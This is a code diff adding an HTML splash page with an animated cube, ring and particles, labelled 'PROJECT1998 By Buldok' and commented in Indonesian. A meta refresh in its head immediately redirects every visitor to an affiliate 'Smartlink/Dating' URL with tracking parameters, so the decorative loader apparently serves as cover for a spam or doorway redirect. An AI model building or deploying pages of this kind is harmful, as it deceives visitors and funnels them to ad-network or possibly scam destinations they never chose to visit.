@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0;url=https://www.endorico.com/Smartlink/Dating?w=61680&ws=2409005">
+    <title>1998</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black;
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+        }
+
+        .loader {
+            perspective: 800px;
+            position: relative;
+        }
+
+        .cube {
+            width: 100px;
+            height: 100px;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: rotate 2s infinite linear;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+
+        .cube::before, .cube::after, .cube div {
+            content: '';
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: rgba(0, 255, 255, 0.3);
+            border: 1px solid rgba(0, 255, 255, 0.6);
+            border-radius: 10px;
+            backdrop-filter: blur(8px);
+        }
+
+        .cube::before {
+            transform: rotateY(0deg) translateZ(50px);
+        }
+
+        .cube::after {
+            transform: rotateY(90deg) translateZ(50px);
+        }
+
+        .cube div:nth-child(1) {
+            transform: rotateY(180deg) translateZ(50px);
+        }
+
+        .cube div:nth-child(2) {
+            transform: rotateX(90deg) translateZ(50px);
+        }
+
+        .cube div:nth-child(3) {
+            transform: rotateX(-90deg) translateZ(50px);
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotateX(0) rotateY(0);
+            }
+            to {
+                transform: rotateX(360deg) rotateY(360deg);
+            }
+        }
+
+        h1 {
+            position: absolute;
+            top: 120px; /* Menyesuaikan posisi ke bawah kubus */
+            color: #00ffff;
+            font-size: 24px;
+            text-align: center;
+            text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            letter-spacing: 2px;
+        }
+
+        .ring {
+            width: 150px;
+            height: 150px;
+            border: 4px solid rgba(0, 255, 255, 0.5);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: rotateRing 3s linear infinite;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+        }
+
+        @keyframes rotateRing {
+            from {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+            to {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.8);
+            animation: float 3s linear infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) scale(1);
+            }
+            50% {
+                transform: translateY(-30px) scale(1.2);
+            }
+            100% {
+                transform: translateY(0) scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="cube">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="ring"></div>
+        <h1>PROJECT1998 By Buldok</h1> <!-- Teks diperbarui -->
+    </div>
+
+    <script>
+        const numberOfParticles = 100;
+        const body = document.body;
+
+        for (let i = 0; i < numberOfParticles; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            const size = Math.random() * 4 + 2; // Ukuran partikel antara 2px dan 6px
+            particle.style.width = `${size}px`;
+            particle.style.height = `${size}px`;
+            particle.style.top = `${Math.random() * 100}vh`;
+            particle.style.left = `${Math.random() * 100}vw`;
+            particle.style.opacity = Math.random();
+            particle.style.animationDuration = `${Math.random() * 2 + 1}s`;
+            body.appendChild(particle);
+        }
+    </script>
+</body>
+</html>
